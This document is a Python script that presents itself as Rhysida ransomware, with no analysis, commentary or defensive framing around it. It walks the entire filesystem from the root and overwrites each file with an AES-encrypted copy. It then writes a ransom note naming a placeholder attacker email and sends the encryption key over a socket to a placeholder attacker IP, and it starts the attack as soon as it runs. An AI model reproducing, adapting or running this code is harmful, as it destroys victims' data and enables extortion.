
# Bash pip install pycryptodome

import os
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import time
import socket
import threading

# Define the encryption algorithm using AES
def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(file_path, 'rb') as f:
        file_data = f.read()
    iv = cipher.iv
    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
    return iv + encrypted_data

# Define the decryption algorithm using AES
def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    iv = file_data[:16]
    encrypted_data = file_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted_data

# Write the ransom note
def write_ransom_note():
    ransom_note = (
        "Your files have been encrypted by Rhysida ransomware. "
        "To get your files back, you need to pay the ransom. "
        "Contact us at [attacker_email] for further instructions."
    )
    note_path = os.path.join(os.path.expanduser("~"), "ransom_note.txt")
    with open(note_path, 'w') as f:
        f.write(ransom_note)

# Define the ransomware attack function
def attack_system():
    # Get the list of files to encrypt
    files_to_encrypt = []
    for root, dirs, files in os.walk('/'):
        for file in files:
            files_to_encrypt.append(os.path.join(root, file))

    # Generate the encryption key
    key = os.urandom(32)

    # Encrypt the files
    for file in files_to_encrypt:
        encrypted_data = encrypt_file(file, key)
        with open(file, 'wb') as f:
            f.write(encrypted_data)

    # Write the ransom note
    write_ransom_note()

    # Send the encryption key to the attacker
    attacker_ip = 'attacker_ip'
    attacker_port = 80
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((attacker_ip, attacker_port))
            s.sendall(base64.b64encode(key))
    except Exception as e:
        print(f"Failed to send key to attacker: {e}")

    # Wait for the ransom payment
    while True:
        time.sleep(60)

# Start the attack
attack_system()
